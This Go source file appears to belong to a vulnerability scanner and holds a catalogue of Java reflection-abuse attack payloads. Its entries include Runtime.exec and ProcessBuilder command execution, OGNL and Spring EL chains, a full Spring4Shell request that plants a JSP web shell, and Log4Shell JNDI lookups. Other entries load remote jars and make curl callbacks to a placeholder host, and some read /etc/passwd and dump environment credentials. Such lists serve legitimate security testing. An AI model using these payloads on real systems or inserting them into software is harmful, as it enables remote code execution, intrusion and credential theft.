// Package javareflect provides Java-Reflection-abuse payloads for use
// when application code passes user input into reflective calls
// (Class.forName, getDeclaredMethod().invoke(), URLClassLoader,
// BeanUtils.populate, OGNL/EL chains backed by reflection).
//
// Distinct from generic code injection because the *value* is not Java
// source — it is a class-name / method-name string that becomes the
// argument to reflection APIs. Mirrors AWVS Reflection.script.
//
// References: ysoserial gadget catalogue, PortSwigger Java deserialisation
// chapter, HackTricks Java reflection notes, OGNL SSTI write-ups.
package javareflect

// Impact classifies the resulting capability of a successful injection.
type Impact string

const (
	ImpactRCE      Impact = "rce"
	ImpactInfoLeak Impact = "info_leak"
	ImpactSSRF     Impact = "ssrf"
	ImpactDoS      Impact = "dos"
)

// Payload represents one Java-reflection payload.
type Payload struct {
	Value       string
	Technique   string
	Impact      Impact
	Description string
}

// GetPayloads returns all Java-reflection payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetByImpact returns payloads filtered by impact bucket.
func GetByImpact(impact Impact) []Payload {
	var out []Payload
	for _, p := range payloads {
		if p.Impact == impact {
			out = append(out, p)
		}
	}
	return out
}

// GetErrorPatterns returns Java-class error fingerprints. Useful for
// confirming a Java runtime is parsing the request before firing exploit
// payloads.
func GetErrorPatterns() []string {
	return errorPatterns
}

var payloads = []Payload{
	// --- Direct Runtime.exec via reflection ---
	{
		Value:       `Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class).invoke(Class.forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null), "id")`,
		Technique:   "runtime_exec_reflect",
		Impact:      ImpactRCE,
		Description: "Runtime.getRuntime().exec via getDeclaredMethod (defeats getMethod-only filters)",
	},
	{
		Value:       `Class.forName("java.lang.Runtime").getMethod("exec",String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"curl http://{OAST_HOST}/r")`,
		Technique:   "runtime_exec_oob",
		Impact:      ImpactRCE,
		Description: "Reflection RCE with OOB callback (no output channel needed)",
	},

	// --- ProcessBuilder (preferred in JDK 9+ where Runtime.exec(String) deprecated) ---
	{
		Value:       `new java.lang.ProcessBuilder(new String[]{"/bin/sh","-c","id"}).start()`,
		Technique:   "processbuilder_direct",
		Impact:      ImpactRCE,
		Description: "ProcessBuilder direct (JDK 9+)",
	},
	{
		Value:       `Class.forName("java.lang.ProcessBuilder").getDeclaredConstructor(String[].class).newInstance(new String[][]{{"id"}}).start()`,
		Technique:   "processbuilder_reflect",
		Impact:      ImpactRCE,
		Description: "ProcessBuilder via reflection constructor",
	},

	// --- OGNL/Struts-style chain (Class.classLoader walks) ---
	{
		Value:       `("".getClass().forName("java.lang.Runtime").getMethod("exec",String.class).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"))`,
		Technique:   "ognl_classloader_chain",
		Impact:      ImpactRCE,
		Description: "OGNL String.getClass().forName chain",
	},
	{
		Value:       `${@java.lang.Runtime@getRuntime().exec("id")}`,
		Technique:   "spel_runtime",
		Impact:      ImpactRCE,
		Description: "Spring EL @-method-reference Runtime.exec",
	},

	// --- BeanUtils / Apache Commons class-property mass-assignment ---
	{
		Value:       `class.classLoader.URLs[0]=http://{OAST_HOST}/cl`,
		Technique:   "beanutils_classloader",
		Impact:      ImpactRCE,
		Description: "BeanUtils class.classLoader.URLs[0] override (URLClassLoader RCE)",
	},
	{
		Value:       `class.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i %{c.classLoader.resources.context.parent.pipeline.first.pattern}i`,
		Technique:   "tomcat_pipeline_smuggle",
		Impact:      ImpactRCE,
		Description: "BeanUtils → Tomcat pipeline access log RCE (CVE-2022-22965 family)",
	},

	// --- Spring4Shell (CVE-2022-22965) class-property write ---
	{
		Value:       `class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22))){%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22))%20}%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar`,
		Technique:   "spring4shell",
		Impact:      ImpactRCE,
		Description: "Spring4Shell class.module.classLoader.resources mass-assignment RCE",
	},

	// --- URLClassLoader remote-jar load ---
	{
		Value:       `new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://{OAST_HOST}/x.jar")}).loadClass("Exploit").newInstance()`,
		Technique:   "url_classloader_remote_jar",
		Impact:      ImpactRCE,
		Description: "URLClassLoader remote-jar class load",
	},

	// --- JNDI lookup (Log4Shell pre-2.16 fix surface) ---
	{
		Value:       `${jndi:ldap://{OAST_HOST}/x}`,
		Technique:   "jndi_ldap",
		Impact:      ImpactRCE,
		Description: "JNDI LDAP lookup (Log4Shell / unrestricted naming.InitialContext)",
	},
	{
		Value:       `new javax.naming.InitialContext().lookup("ldap://{OAST_HOST}/x")`,
		Technique:   "jndi_direct",
		Impact:      ImpactRCE,
		Description: "Direct javax.naming.InitialContext.lookup",
	},

	// --- Information leak via getDeclaredFields ---
	{
		Value:       `Class.forName("java.lang.System").getMethod("getenv").invoke(null)`,
		Technique:   "system_getenv",
		Impact:      ImpactInfoLeak,
		Description: "System.getenv() → leaks env (often DB creds)",
	},
	{
		Value:       `Class.forName("java.lang.System").getMethod("getProperties").invoke(null)`,
		Technique:   "system_properties",
		Impact:      ImpactInfoLeak,
		Description: "System.getProperties() — leaks JVM/path/user info",
	},
	{
		Value:       `new java.io.BufferedReader(new java.io.FileReader("/etc/passwd")).readLine()`,
		Technique:   "file_read_reflect",
		Impact:      ImpactInfoLeak,
		Description: "BufferedReader → /etc/passwd",
	},

	// --- SSRF via new java.net.URL().openConnection() ---
	{
		Value:       `new java.net.URL("http://{OAST_HOST}/ssrf").openConnection().getInputStream()`,
		Technique:   "url_openconnection_ssrf",
		Impact:      ImpactSSRF,
		Description: "URL().openConnection SSRF",
	},

	// --- DoS via infinite loop in reflection (sanity probe gating) ---
	{
		Value:       `Class.forName("java.lang.Thread").getMethod("sleep",long.class).invoke(null,10000L)`,
		Technique:   "thread_sleep_dos",
		Impact:      ImpactDoS,
		Description: "Thread.sleep via reflection — time-based confirm-vuln",
	},
}

var errorPatterns = []string{
	"java.lang.RuntimeException",
	"java.lang.NoSuchMethodException",
	"java.lang.ClassNotFoundException",
	"java.lang.IllegalAccessException",
	"java.lang.reflect.InvocationTargetException",
	"javax.naming.NamingException",
	"at sun.reflect.",
	"at jdk.internal.reflect.",
	"Apache Tomcat",
	"java.lang.SecurityException",
}
